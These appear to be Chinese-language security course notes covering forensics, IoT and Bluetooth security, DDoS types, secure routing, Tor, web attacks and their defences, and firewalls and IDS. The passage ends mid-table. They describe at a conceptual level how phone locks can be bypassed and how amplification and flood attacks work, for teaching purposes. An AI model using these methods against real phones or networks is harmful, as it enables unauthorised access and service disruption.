<h2 id="手机取证"><a class="header" href="#手机取证">手机取证</a></h2>
<p>如何获取绕过手机密码？</p>
<ol>
<li>Smudge Attack(污渍取证)<sup class="footnote-reference"><a href="#1">1</a></sup>。以前我们手机的锁屏密码有一种是在9个点间连线（现在大多数是指纹），那我们就可以利用手机上的滑动痕迹破解密码。</li>
<li>NAND mirroring，把手机内存中的所有内容都Dump出来。</li>
<li>ADB and USB Debugging。要求我们的手机已经打开了USB调试，然后我们就可以用adb来对手机进行操作，比如用<code>adb pull</code>命令获取文件。</li>
</ol>
<p>要想给手机的存储做Dump，我们需要获得Root权限。现在的手机Root难度越来越大了（其中有申文博老师很大一部分贡献hhh）</p>
<p>安卓取证常用工具：</p>
<ol>
<li>Android SDK (Software Development Kit)</li>
<li>AVD (Android Virtual Device)</li>
<li>ADB (Android Debug Bridge)</li>
</ol>
<div class="footnote-definition" id="1"><sup class="footnote-definition-label">1</sup>
<p>http://www.perfectclean.com/pdf/SMUDGE_ATTACKS.pdf</p>
</div>
<h2 id="gps取证"><a class="header" href="#gps取证">GPS取证</a></h2>
<p>GPX是一种轻量级的XML数据格式，用于通过互联网在应用程序及Web服务之间交换GPS数据。GPX中的一些重要条目</p>
<ul>
<li>WayPoint: 用户定义的某个地理位置。</li>
<li>Route: 用户定义的一系列WayPoint组成一条Route。</li>
<li>Track Point: GPS设备记录他曾经到达的位置的信息，记录包含时间戳，经纬度和海拔。当然，记录前提是已经和GPS卫星建立了连接。</li>
<li>Track Log: Track Point列表，或者说，他记录了用户的行动轨迹。</li>
</ul>
<p>可以使用Google Earth解析GPX，显示航迹。</p>
<h2 id="相机取证"><a class="header" href="#相机取证">相机取证</a></h2>
<p>可交换图像文件格式(Exchangeable image file format，Exif)，是专门为数码相机的照片设定的文件格式，可以记录数码照片的属性信息和拍摄数据。</p>
<p>他除了图片外还存储的信息包括</p>
<div class="table-wrapper"><table><thead><tr><th>IFD(Image File Directories)</th><th>Description</th></tr></thead><tbody>
<tr><td>Camera</td><td>Information about the camera that took the photo, and the picture taking conditions at the time the picture was taken</td></tr>
<tr><td>Image</td><td>Camera settings used to take the image</td></tr>
<tr><td>Thumbnail</td><td>Information about the thumbnail image</td></tr>
<tr><td>Interoperability</td><td>Information about the version of the EXIF Specification used to create the image file</td></tr>
<tr><td>GPS</td><td>Information about the location and orientation of the camera at the time the image was taken (using the satellite Global Positioning System)</td></tr>
<tr><td>Maker Note</td><td>Information specific to the make and model of camera used</td></tr>
</tbody></table>
</div><div style="break-before: page; page-break-before: always;"></div><h1 id="网络取证"><a class="header" href="#网络取证">网络取证</a></h1>
<p><strong>网络取证Network forensics</strong> is the analysis of network events, including network traffic, netflow, security device or appliance log, in order to ascertain.</p>
<p><img src="Basic/Secure/Forensics/../images/image-20220618192754015.png" alt="image-20220618192754015" /></p>
<p>交换机的Monitor Port，将一个或多个源端口的数据流量转发到Monitor Port来实现对网络的监听。在企业中用镜像功能，可以很好地对企业内部的网络数据进行监控管理，在网络出故障的时候，可以快速地定位故障。</p>
<p>NetFlow是一种网路监测功能，可以收集进入及离开网路界面的IP封包的数量及资讯，最早由思科公司研发，应用在路由器及交换器等产品上。经由分析Netflow收集到的资讯，网路管理人员可以知道封包的来源及目的地，网路服务的种类，以及造成网路壅塞的原因。</p>
<div style="break-before: page; page-break-before: always;"></div><h1 id="无线与物联网安全"><a class="header" href="#无线与物联网安全">无线与物联网安全</a></h1>
<p>Security是什么？Security要实现CIA(confidentiality, integrity, availability)，除此之外还有Authenticity, Access Control, Non-reputability, Accountability</p>
<h2 id="无线通信和物联网基础"><a class="header" href="#无线通信和物联网基础">无线通信和物联网基础</a></h2>
<p>无线信道</p>
<ul>
<li>Eavesdropping is easy 很容易窃听</li>
<li>Injecting bogus messages into the network is easy 很容易将虚假消息注入网络</li>
<li>Replaying previously recorded messages is easy 很容易重放攻击</li>
<li>Illegitimate access to the network and its services is easy 很容易非法访问网络和服务</li>
<li>Denial of service is easily achieved by jamming 很容易通过发送大量垃圾实现DoS</li>
</ul>
<p>常用的无线通信方式</p>
<p><img src="Basic/Secure/../images/2004_Wireless_Blog_Chart_R2.png" alt="img" /> <sup class="footnote-reference"><a href="#pic1">1</a></sup></p>
<p><img src="Basic/Secure/../images/LPWAN.jpg" alt="IoT Wireless Technologies" /> <sup class="footnote-reference"><a href="#pic2">2</a></sup></p>
<p>物联网分层</p>
<p><img src="Basic/Secure/../images/image-20220614162527873.png" alt="image-20220614162527873" /></p>
<p>硬件设备</p>
<ul>
<li>
<p>传感器 sensor</p>
</li>
<li>
<p>微处理器 Microprocessor</p>
</li>
<li>
<p>通信芯片 Communication Chip 最耗电</p>
</li>
<li>
<p>供电装置 电池</p>
</li>
<li>
<p>联网终端规模化：物联网时代每一件物品均具有通信功能，成为网络终端。5-10年内联网终端规模有望突破百亿。</p>
</li>
<li>
<p>感知识别普适化：无所不在的感知和识别将传统上分离的物理世界和信息世界高度融合</p>
</li>
<li>
<p>异构设备互联化：各种异构设备利用无线通信模块和协议自组成网，异构网络通过“网关”互通互联。</p>
</li>
<li>
<p>管理处理智能化：物联网高效可靠组织大规模数据，与此同时，运筹学，机器学习，数据挖掘，专家系统等决策手段将广泛应用于各行各业。</p>
</li>
<li>
<p>应用服务链条化：以工业生产为例，物联网技术覆盖从原材料引进，生产调度，节能减排，仓储物流到产品销售，售后服务等各个环节。</p>
</li>
</ul>
<h2 id="无线和物联网安全"><a class="header" href="#无线和物联网安全">无线和物联网安全</a></h2>
<p>无线通信是非常脆弱的</p>
<ul>
<li>广播通信，比有限网络更容易受到窃听和干扰</li>
<li>便携可移动的</li>
<li>设备的资源受限，容易遭受DoS攻击</li>
<li>一些设备可能处于无人看管的情况，可以直接物理攻击</li>
</ul>
<p>攻击方式 P18 防御方式 P19</p>
<p>我们可以将物联网的安全需求归结为如下几个方面：</p>
<ul>
<li>物联网接入安全 IoT access security: 首先，一个感知节点不能被未经过认证授权的节点或系统访问，这涉及到感知节点的信任管理、身份认证、访问控制等方面的安全需求。因此，传感器网络除了可能遭受同现有网络相同的安全威胁外，还可能受到恶意节点的攻击、传输的数据被监听或破坏、数据的一致性差等安全威胁。</li>
<li>物联网通信安全 IoT communication security: 由于物联网中的通信终端呈指数增长，而现有的通信网络承载能力有限，当大量的网络终端节点接入现有网络时，将会给通信网络带来更多的安全威胁。首先，大量终端节点的接入肯定会带来网络拥塞，而网络拥塞会给攻击者带来可趁之机，从而对服务器产生拒绝服务攻击；其次，由于物联网中的设备传输的数据量较小，一般不会采用复杂的加密算法来保护数据，从而可能导致数据在传输的过程中遭到攻击和破坏；最后，感知层和网络层的融合也会带来一些安全问题。另外，在实际应用中，大量使用无线传输技术，而且大多数设备都处于无人值守的状态，使得信息安全得不到保障，很容易被窃取和恶意跟踪。而隐私信息的外泄和恶意跟踪给用户带来了极大的安全隐患。</li>
<li>物联网数据隐私安全 IoT data privacy security: 随着物联网的发展和普及，数据呈现爆炸式增长，个人和企业追求更高的计算性能，软、硬件维护费用日益增加，使得个人和企业的设备已无法满足需求。因此云计算、网格计算、普适计算、云计算等应运而生。虽然这些新型计算模式解决了个人和企业的设备需求，但同时也使他们承担着对数据失去直接控制的危险。因此，针对数据处理中的外包数据的安全隐私保护技术显得尤为重要了。由于传统的加密算法在对密文的计算、检索方面表现的差强人意，故需要研究可在密文状态下进行检索和运算的加密算法就显得十分必要了。</li>
<li>物联网应用安全IoT computing system security: 物联网的应用领域非常广泛，渗透到了现实生活中的各行各业，由于物联网本身的特殊性，其应用安全问题除了现有网络应用中常见的安全威胁外，还存在更为特殊的应用安全问题。物联网应用中，除了传统网络的安全需求（如认证、授权、审计等）外，还包括物联网应用数据的隐私安全需求和服务质量需求，应用部署安全需求等。</li>
</ul>
<div class="table-wrapper"><table><thead><tr><th>安全角度</th><th>安全需求</th></tr></thead><tbody>
<tr><td>物联网接入安全 IoT access security</td><td>首先，一个感知节点不能被未经过认证授权的节点或系统访问，这涉及到感知节点的信任管理、身份认证、访问控制等方面的安全需求。因此，传感器网络除了可能遭受同现有网络相同的安全威胁外，还可能受到恶意节点的攻击、传输的数据被监听或破坏、数据的一致性差等安全威胁。</td></tr>
<tr><td>物联网通信安全 IoT communication security</td><td>由于物联网中的通信终端呈指数增长，而现有的通信网络承载能力有限，当大量的网络终端节点接入现有网络时，将会给通信网络带来更多的安全威胁。首先，大量终端节点的接入肯定会带来网络拥塞，而网络拥塞会给攻击者带来可趁之机，从而对服务器产生拒绝服务攻击；其次，由于物联网中的设备传输的数据量较小，一般不会采用复杂的加密算法来保护数据，从而可能导致数据在传输的过程中遭到攻击和破坏；最后，感知层和网络层的融合也会带来一些安全问题。另外，在实际应用中，大量使用无线传输技术，而且大多数设备都处于无人值守的状态，使得信息安全得不到保障，很容易被窃取和恶意跟踪。而隐私信息的外泄和恶意跟踪给用户带来了极大的安全隐患。</td></tr>
<tr><td>物联网数据隐私安全 IoT data privacy security</td><td>随着物联网的发展和普及，数据呈现爆炸式增长，个人和企业追求更高的计算性能，软、硬件维护费用日益增加，使得个人和企业的设备已无法满足需求。因此云计算、网格计算、普适计算、云计算等应运而生。虽然这些新型计算模式解决了个人和企业的设备需求，但同时也使他们承担着对数据失去直接控制的危险。因此，针对数据处理中的外包数据的安全隐私保护技术显得尤为重要了。由于传统的加密算法在对密文的计算、检索方面表现的差强人意，故需要研究可在密文状态下进行检索和运算的加密算法就显得十分必要了。</td></tr>
<tr><td>物联网应用安全IoT computing system security</td><td>物联网的应用领域非常广泛，渗透到了现实生活中的各行各业，由于物联网本身的特殊性，其应用安全问题除了现有网络应用中常见的安全威胁外，还存在更为特殊的应用安全问题。物联网应用中，除了传统网络的安全需求（如认证、授权、审计等）外，还包括物联网应用数据的隐私安全需求和服务质量需求，应用部署安全需求等。</td></tr>
</tbody></table>
</div>
<ol>
<li>物联网感知安全物联网的感知节点接入和用户接入离不开<strong>身份认证和访问控制</strong>等信息安全技术。</li>
<li>物联网数据安全物联网的<strong>保密性</strong>要求信息具有只能被授权用户使用，不被泄漏的特征。常用的<strong>保密技术包括防侦收、防辐射、信息加密、物理保密</strong>。</li>
<li>物联网安全控制物联网安全控制要求信息具有<strong>不可抵赖性</strong>，即信息交互过程中所有参与者都不可能否认或者抵赖曾经完成的操作和承诺的特性。</li>
<li>物联网安全审计物联网安全审计要求物联网具有<strong>保密性与完整性</strong>。保密性要求信息不能被泄漏给未授权的用户；完整性要求信息不受各种原因的破坏。</li>
<li>物联网隐私安全除去上述安全指标之外，物联网中还需要考虑<strong>隐私</strong>的问题。</li>
</ol>
<h2 id="蓝牙安全"><a class="header" href="#蓝牙安全">蓝牙安全</a></h2>
<p>蓝牙是用于短距离数据交换的无线通信技术。</p>
<p>蓝牙技术的物理层采用跳频扩频结合的调制技术，频段范围是2.402GHz-2.480GHz，通信速率一般能达到1Mbps左右。蓝牙设备有两种可能的角色，分别为<strong>主设备和从设备</strong>。同一个蓝牙设备可以在这两种角色之间转换。一个主蓝牙设备可以最多同时和7个活跃的从设备或者255个不活跃的从设备通信。2021年7月，蓝牙技术联盟推出了蓝牙5.3规范。</p>
<p>蓝牙无线通讯技术从4.0开始包含两个蓝牙标准。<strong>经典蓝牙</strong>可以用数据量比较大的传输，如：图像、视频、音乐等。<strong>低功耗蓝牙</strong>的数据传输用于实时性要求比较高但数据速率比较低的产品，如智能穿戴设备、遥控类的，鼠标，键盘，遥控鼠标(Air Mouse)，还有传感设备的数据发送，如心跳带，血压计，温度传感器等等、其应用的行业和方向也比较广泛。</p>
<p>蓝牙分为三个安全模式</p>
<ul>
<li>Security Mode 1: Non-Secure Mode 这种模式下的蓝牙设备是不分敌我的，并且不采用任何机制来阻止其他蓝牙设备建立连接。如果远程设备发起配对、认证或加密请求，则安全模式1设备将接受该请求而不加任何认证。</li>
<li>Security Mode 2: Service level enforced security mode</li>
<li>Security Mode 3: Link-level enforced security mode</li>
</ul>
<p>现在蓝牙安全面对的问题</p>
<div class="table-wrapper"><table><thead><tr><th><strong>Security Issue</strong></th><th><strong>Remarks</strong></th></tr></thead><tbody>
<tr><td>Strength of the Random Number Generator (RNG) is unknown.</td><td>RNG may produce periodic numbers that reduces the strength of authentication mechanism.</td></tr>
<tr><td>Short PINs are allowed.</td><td>Such weak PINs are used to generate link and encryption keys that are easily predictable.</td></tr>
<tr><td>Encryption key length is negotiable.</td><td>More robust initialization key generation procedure should be developed.</td></tr>
<tr><td>No user authentication exists.</td><td>As only device authentication is provided, application security and user authentication can be employed.</td></tr>
<tr><td>Stream cipher is weak and key length is negotiable.</td><td>Robust encryption procedure and minimum key length should be decided and passed as an agreement.</td></tr>
<tr><td>Privacy can be compromised if the BD_ADDR is captured and associated with a particular user.</td><td>Once the BD_ADDR is associated with a particular user, that user’s activity can be logged. So, loss of privacy can be compromised.</td></tr>
<tr><td>Device authentication is simple shared key challenge response.</td><td>One-way authentication may be subjected to man-in-middle attacks. Mutual authentication is a good idea to provide verification.</td></tr>
</tbody></table>
</div>
<h2 id="rfid安全"><a class="header" href="#rfid安全">RFID安全</a></h2>
<p>RFID分为3 Components</p>
<ul>
<li>Transceiver - Tag Reader</li>
<li>Transponder - RFID tag</li>
<li>Antenna</li>
</ul>
<p>他的特点：</p>
<ul>
<li>Passive device – receives power from reader (被动式，能量来自Reader)</li>
<li>Range of up to several meters （短距离）</li>
<li>In effect a “smart label”: simply calls out its (unique) name and/or static data （只能读取静态数据，起标签作用。算力很低）</li>
<li>Basic Tag只能读取，也有可读写的Tag</li>
</ul>
<p>RFID没有加密，有很大的隐私泄露问题。解决方案</p>
<ol>
<li>摧毁RFID标签，比如超市货物的标签</li>
<li>重命名RFID标签</li>
<li>控制标签的距离，限制识别距离</li>
<li>立法</li>
</ol>
<h2 id="wep--wpa--wpa2"><a class="header" href="#wep--wpa--wpa2">WEP &amp; WPA &amp; WPA2</a></h2>
<p>WEP非常不安全，使用RC4加密。</p>
<hr />
<div class="footnote-definition" id="pic1"><sup class="footnote-definition-label">1</sup>
<p>Wireless Connectivity Options for IoT Applications – Technology Comparison https://www.bluetooth.com/blog/wireless-connectivity-options-for-iot-applications-technology-comparison/
<sup class="footnote-reference"><a href="#pic2">2</a></sup>: 6 Leading Types of IoT Wireless Tech and Their Best Use Cases https://behrtech.com/blog/6-leading-types-of-iot-wireless-tech-and-their-best-use-cases/</p>
</div>
<div style="break-before: page; page-break-before: always;"></div><h1 id="网络安全"><a class="header" href="#网络安全">网络安全</a></h1>
<p>CIA: confidentiality(保密性) integrity(完整性) availability(可用性)</p>
<h2 id="ddos"><a class="header" href="#ddos">DDoS</a></h2>
<ul>
<li>Dos: Denial-of-Service Attack</li>
<li>DDos: Distributed Denial-of-Service Attack</li>
</ul>
<p>DDoS针对网络不同层次的攻击：</p>
<ol>
<li>Application layer: Server通常需要进行代价昂贵的密码学计算和数据库查询工作，可以用DDoS消耗Server算力。</li>
<li>Transport layer: Server需要维护大量的连接/状态</li>
<li>link/IP layer: 可以发送很多数据让交换机/路由器难以承受。</li>
</ol>
<p>DDoS防御：</p>
<ol>
<li>
<p>make server harder to be attacked:</p>
<ol>
<li>Ingress Filtering(入口过滤): ISP only forwards packets with legitimate source IP。在Source AS去做，但是同一个AS内部的IP欺骗无法预防。</li>
<li>Traceback: router adds its own IP address to packet, victim reads path from packet。可以把路过的路由器都加上去，也可以选取部分加上去。</li>
<li>Path Validation</li>
<li>Alibi Routing</li>
</ol>
</li>
<li>
<p>enrich server with more resources;</p>
</li>
<li>
<p>leverage the sources of others;</p>
</li>
<li>
<p>cost more resources from attacker</p>
<ol>
<li>Completely Automated Public Turing test to tell Computers and Humans Apart: 验证码</li>
<li>Client Puzzles: 让用户做工作量证明，比如哈希计算</li>
</ol>
</li>
</ol>
<p>IP 欺骗是指创建源地址经过修改的 Internet 协议 (IP) 数据包，目的要么是隐藏发送方的身份，要么是冒充其他计算机系统，或者两者兼具。恶意用户往往采用这项技术对目标设备或周边基础设施发动 DDoS 攻击。</p>
<h3 id="ping-flood"><a class="header" href="#ping-flood">Ping Flood</a></h3>
<p>利用ICMP Echo Request和ICMP Echo Reply。攻击者使用多个设备将许多ICMP Echo Request数据包发送到目标服务器，这时目标服务器需要将ICMP Echo Reply数据包发送到每个请求设备的 IP 地址作为响应，从而浪费目标服务器的带宽。</p>
<p>Ping Flood的攻击流量是对称的；目标设备接收的带宽量是每个机器人发送的总流量之和。</p>
<p>一个简单的防御方式是禁用服务器或者其他设备的ICMP功能。但是这也意味着正常的ICMP请求也失效。</p>
<h3 id="tcp-syn-flood"><a class="header" href="#tcp-syn-flood">TCP SYN Flood</a></h3>
<img src="Basic/Secure/../images/image-20220321151759700.png" alt="image-20220321151759700" style="zoom: 33%;" />
<p>当用户发送的SYN包时，Server就需要分配资源，返回SYN/ACK包等待ACK。**等待ACK队列(backlog)**的长度是有限制的。backlog队列满时，新的连接请求就会被丢弃。通过这种方式，攻击者发送大量的SYN，让正常的连接请求无法得到响应。</p>
<p>不过backlog entry是有时间限制的，如果一段时间（如3min）没有收到ACK，就会被丢弃。攻击者通过backlog length和timeout，可以以一定频率发送SYN让backlog一直处于满的状态。</p>
<p>防御方式</p>
<ul>
<li><strong>SYN Cookie</strong> 是对TCP服务器端的三次握手协议作一些修改，专门用来防范SYN Flood攻击的一种手段。它的原理是，在TCP服务器收到TCP SYN包并返回TCP SYN+ACK包时，不分配一个专门的数据区，而是根据这个SYN包计算出一个cookie值。在收到TCP ACK包时，TCP服务器再根据那个cookie值检查这个TCP ACK包的合法性。如果合法，再分配专门的数据区进行处理未来的TCP连接。 把存储空间的消耗变成算力的消耗。</li>
<li><strong>Backscatter</strong> </li>
</ul>
<h3 id="smurf-attack"><a class="header" href="#smurf-attack">Smurf Attack</a></h3>
<ol>
<li>首先，Smurf 恶意软件构建一个欺骗性数据包，其源地址设置为目标受害者的真实 IP 地址。</li>
<li>然后，数据包被发送到路由器或防火墙的 IP <strong>广播</strong>地址，后者将请求发送到广播网络内的每个主机设备地址，因此网络上联网设备有多少，就会增加多少个请求。</li>
<li>网络中的每个设备都接收来自广播设备的请求，然后使用 ICMP Echo Reply 数据包响应目标的欺骗性地址。</li>
<li>目标受害者随后收到大量的 ICMP Echo Reply 数据包，可能会不堪重负，并导致对合法流量拒绝服务。</li>
</ol>
<p>这是一个非对称的攻击。解决办法可以是在路由器或防火墙上禁止IP broadcast address。</p>
<h3 id="dns-amplification-attack"><a class="header" href="#dns-amplification-attack">DNS Amplification Attack</a></h3>
<ol>
<li>攻击者使用受损的端点将有欺骗性 IP 地址的 UDP 数据包发送到 DNS 递归服务器。数据包上的欺骗性地址指向受害者的真实 IP 地址。</li>
<li>每个 UDP 数据包都向 DNS 解析器发出请求，通常传递一个参数（例如“ANY”）以接收尽可能最大的响应。</li>
<li>DNS 解析器收到请求后，会向欺骗性 IP 地址发送较大的响应。</li>
<li>目标的 IP 地址接收响应，其周边的网络基础设施被大量流量淹没，从而导致拒绝服务。</li>
</ol>
<p>这是一个非对称的攻击。解决办法可以减少open resolvers，增加source IP verification</p>
<h3 id="ntp-amplification-attack"><a class="header" href="#ntp-amplification-attack">NTP Amplification Attack</a></h3>
<p>原理和DNS放大攻击一样，不过是利用了另一个协议Network Time Protocol</p>
<ol>
<li>攻击者使用僵尸网络将带有伪造 IP 地址的 UDP 包发送到启用了 monlist 命令的 NTP 服务器。每个包的伪造 IP 地址都指向受害者的真实 IP 地址。</li>
<li>每个 UDP 数据包使用其 monlist 命令向 NTP 服务器发出请求，导致较大的响应。</li>
<li>然后，服务器用结果数据响应欺骗性的地址。</li>
<li>目标的 IP 地址接收响应，其周边的网络基础设施被大量流量淹没，从而导致拒绝服务。</li>
</ol>
<p>Memcached Attack和SSDP Attack也是类似的，不过是利用的不同的协议。都是非对称的流量攻击。</p>
<h3 id="ssltls-flood"><a class="header" href="#ssltls-flood">SSL/TLS Flood</a></h3>
<p>这个的思路是利用非对称加密的性质，解密需要的算力远大于加密需要的算力。</p>
<h3 id="http-flood"><a class="header" href="#http-flood">HTTP Flood</a></h3>
<ol>
<li><strong>HTTP GET 攻击</strong> - 在这种攻击形式下，多台计算机或其他设备相互协调，向目标服务器发送对图像、文件或其他资产的多个请求。当目标被传入的请求和响应所淹没时，来自正常流量源的其他请求将被拒绝服务。</li>
<li><strong>HTTP POST 攻击</strong> - 一般而言，在网站上提交表单时，服务器必须处理传入的请求并将数据推送到持久层（通常是数据库）。与发送 POST 请求所需的处理能力和带宽相比，处理表单数据和运行必要数据库命令的过程相对密集。这种攻击利用相对资源消耗的差异，直接向目标服务器发送许多 POST 请求，直到目标服务器的容量饱和并拒绝服务为止。</li>
</ol>
<h3 id="fragmented-http-flood"><a class="header" href="#fragmented-http-flood">Fragmented HTTP Flood</a></h3>
<p>把HTTP请求分成很小的片段，隔很久的时间发一个（不能超时）。长时间保持消耗资源的连接处于活动状态。</p>
<h3 id="sdn-crosspath-attack"><a class="header" href="#sdn-crosspath-attack">SDN CrossPath Attack</a></h3>
<h3 id="memcached-attack"><a class="header" href="#memcached-attack"><a href="https://www.cloudflare.com/zh-cn/learning/ddos/memcached-ddos-attack/">Memcached attack</a></a></h3>
<h2 id="secure-routing"><a class="header" href="#secure-routing">Secure Routing</a></h2>
<p>安全问题：</p>
<p>Prefix hijking: Prefix hijacking happens when a network, whether intentionally or mistakenly, originates a prefix that belongs to another network without its permission, and the traffic will be sent to the wrong AS.</p>
<p>Path Tampering: 谎报邻居。Remove ASes from the AS path or Add ASes to the AS path.</p>
<p>解决方案：</p>
<p>RPKI: Resource Public Key Infrastructure(RPKI) certified mapping from <strong>ASes to public keys and IP prefixes</strong>. It is insufficient because malicious router can pretend to  connect to the valid origin.</p>
<p>S-BGP: Each AS on the path cryptographically signs its announcement</p>
<h2 id="anonymous-communication"><a class="header" href="#anonymous-communication">Anonymous Communication</a></h2>
<p>HTTPS is for Confidentiality, not for Anonymity.</p>
<p>匿名通信的目的是为了让网络上的其他节点无法知道sender和receiver之间的通信。有时也希望让receiver不知道是哪个sender在和他通信。</p>
<h3 id="relay"><a class="header" href="#relay">Relay</a></h3>
<p>通过中继节点，类似代理。但是意味着我们需要信任中继节点。</p>
<p><img src="Basic/Secure/../images/image-20220321230238396.png" alt="image-20220321230238396" /></p>
<h3 id="crowds-algorithm"><a class="header" href="#crowds-algorithm">Crowds Algorithm</a></h3>
<p>每次有p的概率传递给下一个节点，1-p的概率直接传递该目的地。还是需要中间的节点可信。</p>
<p><img src="Basic/Secure/../images/image-20220329154006314.png" alt="image-20220329154006314" /></p>
<h3 id="pof-based-source-routing"><a class="header" href="#pof-based-source-routing">POF-based Source Routing</a></h3>
<p>不指定目的，而指定每一个路由器的转发端口，从而指定路径。</p>
<h3 id="onion-routing"><a class="header" href="#onion-routing">Onion routing</a></h3>
<p>Tor是一个三重代理（也就是说Tor每发出一个请求会先经过Tor网络的3个节点），其网络中有两种主要服务器角色：</p>
<ul>
<li>中继服务器：负责中转数据包的路由器，可以理解为代理；</li>
<li>目录服务器：保存Tor网络中所有中继服务器列表相关信息（保存中继服务器地址、公钥）。</li>
</ul>
<blockquote>
<p>为了发送洋葱数据包，发送消息者会从**“目录节点”（directory node）<strong>提供的列表中选取一些节点，并以这些规划出一条被称作</strong>“链”（chain）<strong>或</strong>“线路”（circuit）**的发送路径，这条路径将为传输数据包所用。为了确保发送者的匿名性，任一节点都无法知道在链中自己的前一个节点是发送者还是链上的另一节点；同理，任一节点也无法知道在链中自己的下一节点是目的地还是链上另一节点。只有链上的最后一个节点知道自己是链上最终节点，该节点被称作“出口节点”（exit node）。[11]</p>
<p>洋葱路由网络使用非对称加密，发送者从目录节点获得一把公开密钥，用之将要发送的消息加密并发送给链上的第一个节点，该节点又被称作入口节点（entry node）；其后与之创建连线和共享密钥。创建连线后发送者就可以通过这条连线发送加密过的消息至链上的第二个节点，该消息将只有第二个节点可以解密；当第二个节点收到此消息后，便会与前一个节点也就是入口节点同样的创建连线，使发送者的加密连线延伸到它，但第二个节点并不晓得前一个节点在链中的身份。之后按照同样原理，发送者通过入口节点和第二个节点的这条加密连线将只有第三个节点能解密的消息发送给第三个节点，第三节点同样的与第二个节点创建连线；借由重复相同的步骤，发送者能产生一条越来越长的连线，但在性能上仍有限制。[11]</p>
<p>当链上的连线都创建后，发送者就可以透过其发送资料并保持匿名性。当目的地回送资料时，链上的节点会透过同一条连线将资料回传，且一样对资料层层加密，但加密的顺序与发送者完全相反；原发送者收到目的地回传的资料时，将仅剩最内一层加密，此时对其解密就可拿到目的地回送的消息。</p>
</blockquote>
<p><img src="Basic/Secure/../images/image-20220321231528595.png" alt="image-20220321231528595" /></p>
<h2 id="web-security"><a class="header" href="#web-security">Web Security</a></h2>
<h3 id="sql-injection"><a class="header" href="#sql-injection">SQL Injection</a></h3>
<p>Sanitize user input: check or enforce that value/string does not have commands of any sort, disallow special characters, or escape input string</p>
<p>Escape input string: the input string should be interpreted as a string and not as a special char; to escape the SQL parser, use backslash \ in front of special characters, such as quotes or backslashes</p>
<p>Fundamental solution: separate data and code</p>
<h3 id="csrf"><a class="header" href="#csrf">CSRF</a></h3>
<blockquote>
<p>Same-<strong>Origin</strong> Policy：One origin should not be able to access the resources of another origin. </p>
<p>Origin = Protocol + Hostname + Port。</p>
<p>为了绕开同源策略，有两种办法：XSS 利用的是用户对指定网站的信任，CSRF 利用的是网站对用户网页浏览器的信任。</p>
</blockquote>
<p>让用户点链接的方式，可以是一个钓鱼网站，也可能是垃圾邮件，等等。</p>
<p><img src="Basic/Secure/../images/csrf-cross-site-request-forgery.png" alt="CSRF Example" /></p>
<p>所以一个解决办法，</p>
<ol>
<li>进行Referer Validation，j7mj</li>
<li>使用CSRF Token。网站在用户登录时签发给用户一个CSRF Token，该token不存放在cookie中（存放在浏览器的local storage中），由网站前端js调用（识别<code>{{form.field_name}}</code> ），在提交表单时需要携带该token从而验证该表单来自于本网站（服务器端的token验证数据存放在session中）。这个token可以放在HTTP Header也可以放在HTTP Body传递。</li>
</ol>
<h3 id="xss"><a class="header" href="#xss">XSS</a></h3>
<ul>
<li>
<p>Stored XSS：只要用户访问即可触发</p>
<p><img src="Basic/Secure/../images/sorted-XSS.png.webp" alt="Stored XSS example" /></p>
</li>
<li>
<p>Reflected XSS：需要让用户点击</p>
<p><img src="Basic/Secure/../images/reflexted-xss-1024x598.png" alt="Reflected XSS illustration" /></p>
<p>防御方式：进行输入的检测，和输出的转义。只允许来自特定Origin的script被执行。</p>
</li>
</ul>
<h2 id="email-security"><a class="header" href="#email-security">Email Security</a></h2>
<h3 id="安全威胁"><a class="header" href="#安全威胁">安全威胁</a></h3>
<p>Authenticity-related Threats 用户用私钥对消息的哈希进行加密（就是签名），服务器检查签名。</p>
<p>Integrity-related Threats: 做哈希</p>
<p>Confidentiality-related Threats 生成一个对称密钥对消息加密后传输，用接受者的公钥对对称密钥加密，发送<code>消息加密的结果+密钥加密的结果</code>。</p>
<p>Availability-related Threats </p>
<p><img src="Basic/Secure/../images/image-20220403103606162.png" alt="image-20220403103606162" /></p>
<h2 id="traffic-analysis"><a class="header" href="#traffic-analysis">Traffic Analysis</a></h2>
<h3 id="firewall"><a class="header" href="#firewall">Firewall</a></h3>
<p><img src="Basic/Secure/../images/image-20220328160708985.png" alt="firewall" /></p>
<p>设计目标</p>
<ul>
<li>所有的流量，internal -&gt; external/external -&gt; internal，都要经过防火墙</li>
<li>只有允许的流量才能经过防火墙</li>
<li>防火墙本身不能被渗透</li>
</ul>
<p>设计技术</p>
<ul>
<li>Service Control: 选择开启什么服务（对应的端口）</li>
<li>Direction Control: 特定的流量通过的方向</li>
<li>User Control</li>
<li>Behavior Control: 控制特定的服务能怎么样被利用</li>
</ul>
<p>防火墙的种类</p>
<ul>
<li>Packet Filtering Firewall: 通过包的字段进行分析过滤</li>
<li>Stateful Inspection Firewall: 不是通过单个包来分析，而是本地记录了一些额外的信息（State），结合包的字段综合分析。</li>
<li>Application Proxy Firewall: 应用层的防火墙</li>
<li>Circuit-Level Proxy Firewall: </li>
</ul>
<h3 id="idsintrusion-detection-system"><a class="header" href="#idsintrusion-detection-system">IDS(Intrusion Detection System)</a></h3>
<p>对用户的行为模式进行检测，检查攻击者的流量特征和正常用户流量特征的不同之处。发现异常流量的时候进行报警。</p>
<ul>
<li>Threshold detection: 阈值检测</li>
<li>Profile-based detection (Signature): 和过去正常用户的流量特征对比，观察偏离情况。</li>
</ul>
<p>Honeypot 蜜罐技术</p>
<h3 id="ipsintrusion-prevention-system-"><a class="header" href="#ipsintrusion-prevention-system-">IPS(Intrusion Prevention System )</a></h3>
<p>IDS是被动的检测异常流量然后报警，IPS是主动的检测异常流量然后拦截。</p>
<div class="table-wrapper"><table><thead><tr><th style="text-align: left">PARAMETER</th><th style="text-align: left">FIREWALL</th><th style="text-align: left">IPS</th><th style="text-align: left">IDS</th></tr></thead><tbody>
<tr><td style="text-align: left">Abbreviation for</td><td style="text-align: left">-</td><td style="text-align: left">Intrusion Prevention System</td><td style="text-align: left">Intrusion Detection System</td></tr>
<tr><td style="text-align: left">Philosophy</td><td style="text-align: left">Firewall is a network security device that filters incoming and outgoing network traffic based on predetermined rules</td><td style="text-align: left">IPS is a device that inspects traffic, detects it, classifies and then proactively stops malicious traffic from attack.</td><td style="text-align: left">An intrusion detection system (IDS) is a device or software application that monitors a traffic for malicious activity or policy violations and sends alert on detection.</td></tr>
<tr><td style="text-align: left">Principle of working</td><td style="text-align: left">Filters traffic based on IP address and port numbers</td><td style="text-align: left">inspects real time traffic and looks for traffic patterns or signatures of attack and then prevents the attacks on detection</td><td style="text-align: left">Detects real time traffic and looks for traffic patterns or signatures of attack and them generates alerts</td></tr>
